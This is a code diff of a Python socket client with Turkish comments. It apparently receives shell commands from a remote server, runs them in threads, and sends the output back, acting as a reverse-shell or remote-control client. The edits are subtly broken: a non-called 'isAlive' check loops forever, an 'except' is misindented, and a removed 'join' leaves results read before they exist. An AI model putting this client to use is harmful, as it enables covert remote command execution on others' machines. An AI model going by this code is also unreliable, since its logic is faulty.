@@ -44,14 +44,20 @@ while True:  ##Sürekli veri alış-verişi için
     gelen = s.recv(128).decode('utf-8')
     print(gelen[2:])
     if "apt" in gelen:## eğer bir servis başlıyorsa çıktı dönememe ihtimali var bu yüzden biz veri olarak kendi cümlemizi gönderiyoruz
-        veri = Thread(target = cevir, args=(gelen,)) 
-        veri.start() 
-        veri.join()
+        try:
+            veri = Thread(target = cevir, args=(gelen,)) 
+            veri.start() 
+            while veri.isAlive:
+                continue
+            s.send("Başarıyla tamamlandı...".encode('utf-8')) 
+         except:
+            msg = "Başarılamadı..."
+            s.send(msg.encode('utf-8'))
         continue
     if gelen == "cd":##eğer komutumuz cd ise bunu özel alıyoruz çünkü cd.. şeklinde bir yazım da olabileceği için hatadan kaçınıyoruz
         veri = Thread(target = cevir, args=(gelen,)) ##Karışıklık ve donmayı önlemek için yeni bir thread başlatıyoruz
         veri.start() 
-        veri.join()
+ 
         s.send(sonuc[0])##Gelen sonucu sunucuya gönderiyoruz
         s.send(sonuc[1])
         sonuc = []##Listemizi tekrardan boşaltıyoruz ve her seferinde verinin indisini bulmak zorunda kalmıyoruz direk 0 ve 1. indisine bakıyoruz
